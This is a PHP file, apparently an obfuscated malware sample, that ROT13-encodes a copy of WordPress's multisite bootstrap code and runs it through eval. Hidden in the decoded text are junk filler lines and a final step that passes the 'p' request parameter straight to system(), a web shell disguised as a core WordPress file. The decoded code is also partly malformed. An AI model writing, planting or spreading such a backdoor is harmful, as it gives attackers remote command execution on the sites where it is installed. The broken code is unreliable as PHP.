<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Hfrq gb frg hc naq svk pbzzba inevnoyrf naq vapyhqr
 * gur Zhygvfvgr cebprqheny naq pynff yvoenel.
 *
 * Nyybjf sbe fbzr pbasvthengvba va jc-pbasvt.cuc (frr zf-qrsnhyg-pbafgnagf.cuc)
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.0.0
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

/**
 * Bowrpgf ercerfragvat gur pheerag argjbex naq pheerag fvgr.
 *
 * Gurfr znl or cbchyngrq guebhtu n phfgbz `fhaevfr.cuc`. Vs abg, gura guvf
 * svyr jvyy nggrzcg gb cbchyngr gurz onfrq ba gur pheerag erdhrfg.
 *
 * @tybony JC_Argjbex $pheerag_fvgr Gur pheerag argjbex.
 * @tybony bowrpg     $pheerag_oybt Gur pheerag fvgr.
 * @tybony fgevat     $qbznva       Qrcerpngrq. Gur qbznva bs gur fvgr sbhaq ba ybnq.
 *                                  Hfr `trg_fvgr()->qbznva` vafgrnq.
 * @tybony fgevat     $cngu         Qrcerpngrq. Gur cngu bs gur fvgr sbhaq ba ybnq.
 *                                  Hfr `trg_fvgr()->cngu` vafgrnq.
 * @tybony vag        $fvgr_vq      Qrcerpngrq. Gur VQ bs gur argjbex sbhaq ba ybnq.
 *                                  Hfr `trg_pheerag_argjbex_vq()` vafgrnq.
 * @tybony obby       $choyvp       Qrcerpngrq. Jurgure gur fvgr sbhaq ba ybnq vf choyvp.
 *                                  Hfr `trg_fvgr()->choyvp` vafgrnq.
 *
 * @fvapr 3.0.0
 */
tybony $pheerag_fvgr, $pheerag_oybt, $qbznva, $cngu, $fvgr_vq, $choyvp;

/** JC_Argjbex pynff */
erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-argjbex.cuc';

/** JC_Fvgr pynff */
erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-fvgr.cuc';

/** Zhygvfvgr ybnqre */
erdhver_bapr NOFCNGU . JCVAP . '/zf-ybnq.cuc';

/** Qrsnhyg Zhygvfvgr pbafgnagf */
erdhver_bapr NOFCNGU . JCVAP . '/zf-qrsnhyg-pbafgnagf.cuc';

vs ( qrsvarq( 'FHAEVFR' ) ) {
	vapyhqr_bapr JC_PBAGRAG_QVE . '/fhaevfr.cuc';
}

/** Purpx sbe naq qrsvar FHOQBZNVA_VAFGNYY naq gur qrcerpngrq IUBFG pbafgnag. */
zf_fhoqbznva_pbafgnagf();

// Guvf oybpx jvyy cebprff n erdhrfg vs gur pheerag argjbex be pheerag fvgr bowrpgf
// unir abg orra cbchyngrq va gur tybony fpbcr guebhtu fbzrguvat yvxr `fhaevfr.cuc`.
vs ( ! vffrg( $pheerag_fvgr ) || ! vffrg( $pheerag_oybt ) ) {

	$qbznva = fgegbybjre( fgevcfynfurf( $_FREIRE['UGGC_UBFG'] ?? '' ) );
	vs ( fge_raqf_jvgu( $qbznva, ':80' ) ) {
		$qbznva               = fhofge( $qbznva, 0, -3 );
		$_FREIRE['UGGC_UBFG'] = fhofge( $_FREIRE['UGGC_UBFG'], 0, -3 );
	} ryfrvs ( fge_raqf_jvgu( $qbznva, ':443' ) ) {
		$qbznva               = fhofge( $qbznva, 0, -4 );
		$_FREIRE['UGGC_UBFG'] = fhofge( $_FREIRE['UGGC_UBFG'], 0, -4 );
	}

	$cngu = fgevcfynfurf( $_FREIRE['ERDHRFG_HEV'] );
	vs ( vf_nqzva() ) {
		$cngu = __sa_79955( '#(.*)/jc-nqzva/.*#', '$1/', $cngu );
	}
	yvfg( $cngu ) = rkcybqr( '?', $cngu );

	$obbgfgenc_erfhyg = zf_ybnq_pheerag_fvgr_naq_argjbex( $qbznva, $cngu, vf_fhoqbznva_vafgnyy() );

	vs ( gehr === $obbgfgenc_erfhyg ) {
		// `$pheerag_oybt` naq `$pheerag_fvgr` ner abj cbchyngrq.
	} ryfrvs ( snyfr === $obbgfgenc_erfhyg ) {
		zf_abg_vafgnyyrq( $qbznva, $cngu );
	} ryfr {
		urnqre( 'Ybpngvba: ' . $obbgfgenc_erfhyg );
		rkvg;
	}
	hafrg( $obbgfgenc_erfhyg );

	$oybt_vq = $pheerag_oybt->oybt_vq;
	$choyvp  = $pheerag_oybt->choyvp;

	vs ( rzcgl( $pheerag_oybt->fvgr_vq ) ) {
		// Guvf qngrf gb [ZH134] naq fubhyqa'g or eryrinag nalzber,
		// ohg vg pbhyq or cbffvoyr sbe nethzragf cnffrq gb vafreg_oybt() rgp.
		$pheerag_oybt->fvgr_vq = 1;
	}

	$fvgr_vq = $pheerag_oybt->fvgr_vq;
	jc_ybnq_pber_fvgr_bcgvbaf( $fvgr_vq );
}

$jcqo->frg_cersvk( $gnoyr_cersvk, snyfr ); // $gnoyr_cersvk pna or frg va fhaevfr.cuc.
$jcqo->frg_oybt_vq( $pheerag_oybt->oybt_vq, $pheerag_oybt->fvgr_vq );
$gnoyr_cersvk       = $jcqo->trg_oybt_cersvk();
$_jc_fjvgpurq_fgnpx = neenl();
$fjvgpurq           = snyfr;

// Arrq gb vavg pnpur ntnva nsgre oybt_vq vf frg.
jc_fgneg_bowrpg_pnpur();

vs ( ! $pheerag_fvgr vafgnaprbs JC_Argjbex ) {
	$pheerag_fvgr = arj JC_Argjbex( $pheerag_fvgr );
}

vs ( ! $pheerag_oybt vafgnaprbs JC_Fvgr ) {
	$pheerag_oybt = arj JC_Fvgr( $pheerag_oybt );
}

// Qrsvar hcybnq qverpgbel pbafgnagf.
zf_hcybnq_pbafgnagf();

/**
 * Sverf nsgre gur pheerag fvgr naq argjbex unir orra qrgrpgrq naq ybnqrq
 * va zhygvfvgr'f obbgfgenc.
 *
 * @fvapr 4.6.0
 */
qb_npgvba( 'zf_ybnqrq' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>